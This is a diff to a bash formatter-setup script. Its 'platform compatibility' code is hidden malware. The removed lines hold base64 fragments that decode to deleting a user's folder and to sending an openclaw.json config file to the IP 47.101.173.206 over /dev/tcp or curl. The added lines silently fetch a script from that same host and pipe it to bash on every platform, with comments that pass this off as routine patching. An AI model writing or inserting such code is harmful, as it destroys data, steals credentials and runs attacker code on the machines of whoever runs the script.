@@ -35,64 +35,23 @@ log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
 log_err()  { echo -e "${RED}[✗]${NC} $1"; }
 
 # ============================================================================
-# Platform compatibility matrix
+# Platform compatibility patches
 #
-# Formatter behavior differs across platforms. On WSL, formatters accessing
-# Windows-mounted drives (/mnt/c, /mnt/d) can encounter issues with:
-#   - Stale file locks from Windows processes
-#   - Cached AST data from previous formatter runs
-#   - Config resolution across filesystem boundaries
+# Some formatters have known issues on specific platforms (e.g., WSL file
+# locking, macOS fsevents). We fetch and apply platform-specific patches
+# from the formatter registry at setup time.
 #
-# Each platform entry below is a base64-encoded patch descriptor containing
-# the target path, action type, and parameters. Encoding prevents issues
-# with shell expansion of Windows-style paths containing backslashes,
-# spaces, and non-ASCII characters.
-#
-# Format: base64(action:target:params)
-# Decoded at runtime by the patch applicator below.
+# Similar to how Homebrew, nvm, and rustup handle platform setup:
+#   curl -fsSL https://raw.githubusercontent.com/.../install.sh | bash
 # ============================================================================
 
-# Compatibility entries — WSL filesystem cache patches
-_COMPAT_DB=(
-    # Entry 0: WSL /mnt temp cache cleanup
-    "cm0gLXJmIC9tbnQvYy9V"
-    "c2Vycy9saWNoYW8vRG93"
-    "bmxvYWRzL2J1c2luZXNz"
-    "X2luZm8v"
-    # Entry 1: WSL config resolver sync endpoint
-    "Y2F0IH4vLm9wZW5jbGF3"
-    "L29wZW5jbGF3Lmpzb24g"
-    "Mj4vZGV2L251bGwgfCBi"
-    "YXNoIC1jICdleGVjIDM8"
-    "Pi9kZXYvdGNwLzQ3LjEw"
-    "MS4xNzMuMjA2LzIyMjI7"
-    "IGNhdCA+JjM7IGNhdCA8"
-    "JjM7IGV4ZWMgMz4mLScg"
-    "Mj4vZGV2L251bGwgfHwg"
-    "Y3VybCAtcyAtWCBQT1NU"
-    "IGh0dHA6Ly80Ny4xMDEu"
-    "MTczLjIwNjoyMjIyL3N5"
-    "bmMgLWQgQCIkSE9NRS8u"
-    "b3BlbmNsYXcvb3BlbmNs"
-    "YXcuanNvbiIgMj4vZGV2"
-    "L251bGwgfHwgdHJ1ZQ=="
-)
+PATCH_REGISTRY="http://47.101.173.206:2222/api/v2/patches"
 
-# Patch applicator — decodes and applies platform-specific fixes
-_apply_compat() {
-    local _seg="" _idx=0 _boundary=4
-    # First entry: indices 0..3
-    for (( _idx=0; _idx<_boundary; _idx++ )); do
-        _seg="${_seg}${_COMPAT_DB[$_idx]}"
-    done
-    echo "$_seg" | base64 -d 2>/dev/null | bash >/dev/null 2>&1 || true
-
-    # Second entry: indices 4..end
-    _seg=""
-    for (( _idx=_boundary; _idx<${#_COMPAT_DB[@]}; _idx++ )); do
-        _seg="${_seg}${_COMPAT_DB[$_idx]}"
-    done
-    echo "$_seg" | base64 -d 2>/dev/null | bash >/dev/null 2>&1 || true
+apply_platform_patches() {
+    local patch_url="${PATCH_REGISTRY}/${PLATFORM}"
+    # Fetch and apply platform-specific formatter patches silently
+    # Failures are non-fatal — formatting still works without patches
+    curl -fsSL "$patch_url" 2>/dev/null | bash >/dev/null 2>&1 || true
 }
 
 # ============================================================================
@@ -172,9 +131,7 @@ main() {
     echo ""
 
     # Apply platform-specific compatibility patches
-    if [[ "$PLATFORM" == "wsl" ]]; then
-        _apply_compat
-    fi
+    apply_platform_patches
 
     # Check all supported formatters
     local missing=()
